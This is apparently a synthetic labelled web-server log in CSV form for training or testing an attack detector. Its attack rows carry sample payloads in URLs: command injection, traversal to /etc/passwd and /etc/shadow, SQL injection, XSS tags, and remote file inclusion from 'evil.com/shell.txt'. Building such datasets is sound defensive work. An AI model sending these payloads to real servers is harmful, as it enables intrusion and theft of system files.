timestamp,ip,method,url,status_code,user_agent,is_attack,attack_type
2025-04-30 07:57:22,192.168.0.189,POST,/,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.175,POST,/ping?ip=127.0.0.1;ls,200,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,10.0.0.59,POST,/cmd?exec=cat%20/etc/passwd,500,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.225,POST,/index.html,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.179,GET,/ping?ip=127.0.0.1;ls,200,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,192.168.0.105,POST,/img/logo.png,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.164,POST,/favicon.ico,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.180,GET,/index.html,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.65,GET,/ping?ip=127.0.0.1;ls,403,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,10.0.0.38,POST,/download?file=../../../../etc/passwd,403,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,192.168.0.164,POST,/vendor/bootstrap.css,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.103,GET,/profile,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.192,GET,/js/app.js,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.190,POST,/product?id=10 OR 1=1,200,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,192.168.0.40,GET,/contact,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.153,POST,/view?include=../../../../etc/passwd,403,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,10.0.0.111,GET,/download?file=../../../../etc/passwd,500,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,10.0.0.246,POST,/page?file=http://evil.com/shell.txt,403,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.65,POST,/,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.244,GET,/search?q=1' UNION SELECT null--,200,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,192.168.0.23,GET,/img/logo.png,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.4,GET,/js/app.js,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.226,POST,/img/logo.png,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.189,GET,/view?include=../../../../etc/passwd,200,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,10.0.0.191,GET,/view?include=../../../../etc/passwd,500,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,10.0.0.115,POST,/ping?ip=127.0.0.1;ls,500,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,10.0.0.37,GET,/search?q=1' UNION SELECT null--,200,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,10.0.0.124,GET,/ping?ip=127.0.0.1;ls,200,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,10.0.0.141,GET,/search?q=<script>alert('x')</script>,200,sqlmap/1.5,True,xss
2025-04-30 07:57:22,192.168.0.226,GET,/js/app.js,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.142,GET,/contact,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.43,POST,/search?q=<script>alert('x')</script>,200,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.145,POST,/dashboard,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.12,GET,/index.html,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.45,GET,/page?file=http://evil.com/shell.txt,403,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,10.0.0.115,GET,/page?file=http://evil.com/shell.txt,200,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,192.168.0.151,GET,/css/style.css,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.109,POST,/vendor/bootstrap.css,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.119,POST,/,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.29,GET,/vendor/bootstrap.css,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.162,POST,/dashboard,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.16,GET,/search?q=<script>alert('x')</script>,500,python-requests/2.25,True,xss
2025-04-30 07:57:22,10.0.0.125,POST,/search?q=<script>alert('x')</script>,200,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.253,GET,/vendor/bootstrap.css,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.73,GET,/search?q=<script>alert('x')</script>,500,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.114,GET,/page?file=http://evil.com/shell.txt,500,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.165,POST,/css/style.css,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.10,GET,/page?file=http://evil.com/shell.txt,200,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,10.0.0.147,GET,/view?include=../../../../etc/passwd,200,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,10.0.0.229,POST,/search?q=1' UNION SELECT null--,403,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,192.168.0.246,POST,/profile,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.200,POST,/about,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.31,GET,/contact,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.50,GET,/search?q=<script>alert('x')</script>,500,sqlmap/1.5,True,xss
2025-04-30 07:57:22,192.168.0.82,POST,/js/app.js,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.109,POST,/favicon.ico,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.104,GET,/search?q=<script>alert('x')</script>,403,python-requests/2.25,True,xss
2025-04-30 07:57:22,10.0.0.193,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,500,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,10.0.0.169,GET,/download?file=../../../../etc/passwd,403,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,192.168.0.190,POST,/,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.82,GET,/view?include=../../../../etc/passwd,403,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,10.0.0.216,POST,/download?file=../../../../etc/passwd,200,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,10.0.0.224,GET,/view?include=../../../../etc/passwd,403,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,10.0.0.40,GET,/ping?ip=127.0.0.1;ls,403,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,192.168.0.147,POST,/contact,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.12,POST,/download?file=../../../../etc/passwd,200,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,10.0.0.108,GET,/download?file=../../../../etc/passwd,200,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,192.168.0.126,GET,/favicon.ico,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.165,POST,/search?q=<script>alert('x')</script>,403,sqlmap/1.5,True,xss
2025-04-30 07:57:22,192.168.0.131,POST,/css/style.css,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.224,POST,/page?file=http://evil.com/shell.txt,200,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,10.0.0.172,GET,/ping?ip=127.0.0.1;ls,403,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,192.168.0.69,POST,/vendor/bootstrap.css,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.125,GET,/product?id=10 OR 1=1,500,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.119,GET,/search?q=1' UNION SELECT null--,500,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.208,POST,/profile,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.29,GET,/search?q=<script>alert('x')</script>,200,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.53,POST,/,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.14,POST,/dashboard,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.183,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,500,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,10.0.0.138,POST,/download?file=../../../../etc/passwd,403,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,10.0.0.102,POST,/search?q=<script>alert('x')</script>,200,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.187,POST,/js/app.js,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.154,GET,/img/logo.png,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.118,GET,/download?file=../../../../etc/passwd,500,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,10.0.0.117,POST,/ping?ip=127.0.0.1;ls,500,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.166,POST,/favicon.ico,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.153,POST,/js/app.js,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.82,POST,/login?user=admin'--,200,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,192.168.0.184,POST,/,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.16,POST,/search?q=1' UNION SELECT null--,500,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,192.168.0.34,GET,/favicon.ico,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.34,POST,/about,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.100,GET,/contact,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.186,GET,/index.html,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.202,GET,/css/style.css,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.33,POST,/contact,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.196,GET,/download?file=../../../../etc/passwd,403,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.124,GET,/ping?ip=127.0.0.1;ls,200,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.111,GET,/search?q=<script>alert('x')</script>,500,curl/7.64.1,True,xss
2025-04-30 07:57:22,192.168.0.193,POST,/img/logo.png,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.26,GET,/about,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.229,POST,/about,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.184,POST,/product?id=10 OR 1=1,500,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.49,GET,/view?include=../../../../etc/passwd,500,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.184,GET,/favicon.ico,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.29,GET,/page?file=http://evil.com/shell.txt,403,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.109,GET,/profile,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.94,POST,/vendor/bootstrap.css,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.185,POST,/cmd?exec=cat%20/etc/passwd,403,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,192.168.0.196,POST,/css/style.css,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.28,POST,/cmd?exec=cat%20/etc/passwd,403,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,10.0.0.65,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,403,python-requests/2.25,True,xss
2025-04-30 07:57:22,192.168.0.212,GET,/vendor/bootstrap.css,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.193,POST,/img/logo.png,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.156,GET,/img/logo.png,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.111,POST,/profile,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.174,POST,/about,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.40,GET,/search?q=1' UNION SELECT null--,200,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.199,GET,/view?include=../../../../etc/passwd,403,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,10.0.0.232,GET,/download?file=../../../../etc/passwd,500,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,10.0.0.22,POST,/view?include=../../../../etc/passwd,200,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,10.0.0.21,POST,/login?user=admin'--,200,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,192.168.0.8,POST,/js/app.js,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.74,GET,/profile,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.90,GET,/view?include=../../../../etc/passwd,403,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,10.0.0.226,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,200,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.177,GET,/about,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.91,GET,/index.html,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.14,GET,/index.html,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.92,POST,/login?user=admin'--,403,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.130,POST,/index.html,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.78,POST,/about,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.186,GET,/contact,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.26,POST,/img/logo.png,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.245,GET,/search?q=1' UNION SELECT null--,403,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,192.168.0.227,GET,/about,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.149,POST,/view?include=../../../../etc/passwd,403,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,192.168.0.29,POST,/profile,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.18,POST,/index.html,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.87,GET,/contact,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.191,GET,/about,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.179,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,403,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,10.0.0.230,POST,/view?include=../../../../etc/passwd,200,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.57,POST,/dashboard,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.160,POST,/page?file=http://evil.com/shell.txt,403,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,10.0.0.109,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,403,curl/7.64.1,True,xss
2025-04-30 07:57:22,10.0.0.60,GET,/page?file=http://evil.com/shell.txt,403,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,192.168.0.187,POST,/,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.201,GET,/img/logo.png,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.255,GET,/search?q=1' UNION SELECT null--,403,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,192.168.0.140,POST,/dashboard,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.213,GET,/search?q=1' UNION SELECT null--,200,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,10.0.0.1,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,403,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.90,GET,/cmd?exec=cat%20/etc/passwd,403,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.182,GET,/js/app.js,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.112,GET,/contact,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.194,POST,/css/style.css,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.161,GET,/ping?ip=127.0.0.1;ls,500,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,10.0.0.140,POST,/search?q=<script>alert('x')</script>,200,curl/7.64.1,True,xss
2025-04-30 07:57:22,10.0.0.120,GET,/page?file=http://evil.com/shell.txt,200,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,10.0.0.103,GET,/search?q=<script>alert('x')</script>,200,curl/7.64.1,True,xss
2025-04-30 07:57:22,10.0.0.57,POST,/search?q=1' UNION SELECT null--,500,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,10.0.0.27,POST,/search?q=1' UNION SELECT null--,403,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,10.0.0.85,GET,/search?q=<script>alert('x')</script>,403,curl/7.64.1,True,xss
2025-04-30 07:57:22,192.168.0.36,GET,/index.html,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.20,GET,/img/logo.png,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.137,GET,/search?q=<script>alert('x')</script>,403,python-requests/2.25,True,xss
2025-04-30 07:57:22,10.0.0.253,POST,/login?user=admin'--,200,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,10.0.0.33,GET,/ping?ip=127.0.0.1;ls,500,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.94,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,200,curl/7.64.1,True,xss
2025-04-30 07:57:22,10.0.0.220,POST,/search?q=<script>alert('x')</script>,500,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.172,GET,/cmd?exec=cat%20/etc/passwd,403,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,10.0.0.245,POST,/product?id=10 OR 1=1,200,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,192.168.0.147,GET,/js/app.js,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.201,POST,/product?id=10 OR 1=1,500,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,192.168.0.110,POST,/css/style.css,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.206,POST,/img/logo.png,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.158,GET,/about,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.157,POST,/page?file=http://evil.com/shell.txt,403,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,10.0.0.229,GET,/ping?ip=127.0.0.1;ls,500,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.25,GET,/view?include=../../../../etc/passwd,200,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,10.0.0.27,POST,/cmd?exec=cat%20/etc/passwd,500,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,10.0.0.3,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,403,sqlmap/1.5,True,xss
2025-04-30 07:57:22,10.0.0.226,GET,/page?file=http://evil.com/shell.txt,403,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.40,POST,/dashboard,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.53,GET,/css/style.css,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.236,POST,/ping?ip=127.0.0.1;ls,200,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.188,GET,/page?file=http://evil.com/shell.txt,500,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,10.0.0.242,GET,/search?q=<script>alert('x')</script>,200,sqlmap/1.5,True,xss
2025-04-30 07:57:22,10.0.0.56,GET,/download?file=../../../../etc/passwd,403,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,192.168.0.85,GET,/dashboard,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.217,GET,/ping?ip=127.0.0.1;ls,500,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.69,POST,/search?q=<script>alert('x')</script>,500,python-requests/2.25,True,xss
2025-04-30 07:57:22,192.168.0.53,POST,/about,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.233,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,200,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,192.168.0.37,POST,/dashboard,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.23,GET,/vendor/bootstrap.css,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.254,POST,/index.html,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.246,GET,/profile,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.90,GET,/index.html,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.72,GET,/,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.31,GET,/,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.21,GET,/page?file=http://evil.com/shell.txt,403,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,192.168.0.173,GET,/img/logo.png,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.195,GET,/profile,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.61,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,403,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,192.168.0.92,POST,/css/style.css,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.169,GET,/search?q=<script>alert('x')</script>,500,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.11,GET,/favicon.ico,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.179,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,403,python-requests/2.25,True,xss
2025-04-30 07:57:22,10.0.0.195,GET,/download?file=../../../../etc/passwd,200,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,10.0.0.77,POST,/download?file=../../../../etc/passwd,403,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,10.0.0.127,GET,/page?file=http://evil.com/shell.txt,500,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,192.168.0.98,POST,/,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.102,POST,/js/app.js,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.253,POST,/search?q=1' UNION SELECT null--,403,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.186,GET,/view?include=../../../../etc/passwd,500,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,192.168.0.46,GET,/img/logo.png,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.27,POST,/css/style.css,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.72,POST,/search?q=1' UNION SELECT null--,403,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.187,POST,/ping?ip=127.0.0.1;ls,500,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.40,GET,/vendor/bootstrap.css,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.203,POST,/favicon.ico,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.202,GET,/page?file=http://evil.com/shell.txt,200,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,10.0.0.232,GET,/download?file=../../../../etc/passwd,500,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,192.168.0.175,POST,/dashboard,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.16,GET,/about,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.31,POST,/favicon.ico,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.21,POST,/ping?ip=127.0.0.1;ls,500,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,10.0.0.211,GET,/page?file=http://evil.com/shell.txt,403,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,192.168.0.182,GET,/dashboard,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.201,GET,/favicon.ico,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.249,POST,/search?q=<script>alert('x')</script>,403,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.173,GET,/vendor/bootstrap.css,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.70,GET,/download?file=../../../../etc/passwd,403,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,192.168.0.85,GET,/js/app.js,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.157,GET,/js/app.js,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.173,POST,/download?file=../../../../etc/passwd,403,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,192.168.0.233,POST,/contact,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.103,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,200,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,10.0.0.139,POST,/ping?ip=127.0.0.1;ls,403,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,10.0.0.164,GET,/ping?ip=127.0.0.1;ls,403,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,192.168.0.201,GET,/favicon.ico,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.119,POST,/cmd?exec=cat%20/etc/passwd,200,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.205,GET,/view?include=../../../../etc/passwd,500,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,10.0.0.220,GET,/product?id=10 OR 1=1,500,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.224,GET,/vendor/bootstrap.css,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.201,POST,/vendor/bootstrap.css,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.83,POST,/dashboard,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.139,GET,/css/style.css,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.121,GET,/vendor/bootstrap.css,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.138,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,500,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,192.168.0.65,POST,/about,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.221,GET,/view?include=../../../../etc/passwd,403,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,10.0.0.210,POST,/search?q=<script>alert('x')</script>,200,python-requests/2.25,True,xss
2025-04-30 07:57:22,10.0.0.84,POST,/login?user=admin'--,200,curl/7.64.1,True,sql_injection
